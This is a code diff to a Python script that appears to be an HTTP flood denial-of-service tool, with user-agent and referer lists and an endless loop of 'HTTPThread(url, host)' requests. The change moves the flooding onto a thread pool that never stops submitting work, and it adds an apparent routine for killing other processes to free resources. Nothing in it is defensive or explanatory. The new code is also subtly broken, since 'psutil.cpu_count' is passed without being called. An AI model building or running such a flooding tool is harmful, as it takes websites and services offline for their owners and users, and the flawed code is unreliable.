@@ -17,6 +17,8 @@ import sys
 import threading
 import random
 import re
+import psutil
+import concurrent.futures
 
 # global params
 headers_useragents = list()
@@ -4914,20 +4916,21 @@ def main():
     init_referer_list()
     pre_starting_info()
 
-    threads = []
+    futures = []
+    killnon_critical()
     try:
-        while True:
-            thread = HTTPThread(url, host)
-            thread.start()
-            threads.append(thread)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=psutil.cpu_count) as executor:
+            while True:
+                thread = HTTPThread(url, host)
+                future=executor.submit(thread.run)
+                futures.append(future)
 
             # Optionally, you can join threads if needed
             # thread.join()
     except KeyboardInterrupt:
         print("Interrupted by user.")
         # Optionally, join threads if you want to wait for their completion
-        for thread in threads:
-            thread.join()
+        concurrent.futures.wait(futures, return_when=concurrent.futures.ALL_COMPLETED)
 
 if __name__ == '__main__':
     main()
